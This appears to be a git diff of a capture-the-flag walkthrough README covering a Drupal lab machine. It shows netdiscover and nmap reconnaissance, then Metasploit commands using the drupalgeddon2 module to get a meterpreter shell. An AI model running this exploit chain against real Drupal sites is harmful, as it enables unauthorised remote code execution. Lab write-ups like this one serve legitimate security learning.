@@ -18,39 +18,53 @@ Depending on your skill level, you may be able to skip finding most of these fla
   
   ### Reconnaissance 
   
+Sudo NetDiscover
+  
 ![Screenshot from 2023-01-16 01-16-55](https://user-images.githubusercontent.com/108471951/212977979-8eb9986d-cfe5-43c1-94aa-c37492e289ed.png)
 
-Firstly we have to identify the machine IP address using tool like NetDiscover [Command = Sudo NetDiscover]
-
+Firstly we have to identify the machine IP address using tool like NetDiscover 
 ### Nmap
+
+nmap -sV 192.168.0.119 (service version scan)
 
 ![Screenshot from 2023-01-17 23-48-32](https://user-images.githubusercontent.com/108471951/212979611-b732a639-bb5c-40b0-a1b5-463c7ed54654.png)
 
-nmap -sV 192.168.0.119 (service version scan)
 
 It’s a drupal site. This is first time i seen a Site named Drupal
 
 
 # Exploiting
 
-I have searched for exploit for drupal site in metasploit [search drupal] 
+msfconsole
+
+search drupal
+
+I have searched for exploit for drupal site in metasploit.
+Found some exploits. By using them tried to Exploit 
 
 ![Screenshot from 2023-01-16 01-19-36](https://user-images.githubusercontent.com/108471951/212982113-653ef59b-b982-4041-b120-1c32feb029e2.png)
 
-Found some exploits. By using them tried to Exploit 
 
+After trying some exploits [ exploit/unix/webapp/drupal_drupalgeddon2 ] worked and given a meterpeter shell
+
+
+
+use1
+
+show option
+
+set rhosts [target IP]
+
+exploit
 
 ![Screenshot from 2023-01-16 01-20-37](https://user-images.githubusercontent.com/108471951/212984577-492ed27c-4f35-4dfb-a98f-e6e3b2723fb3.png)
 
 
 After trying some exploits [ exploit/unix/webapp/drupal_drupalgeddon2 ] worked and given a meterpeter shell
 
-[show options] 
-[set rhosts]
-[exploit]
-
 
 ![Screenshot from 2023-01-18 00-26-17](https://user-images.githubusercontent.com/108471951/212987116-b5d5c9e3-e308-431c-92ce-ce00bcab8eee.png)
+
 
 
 
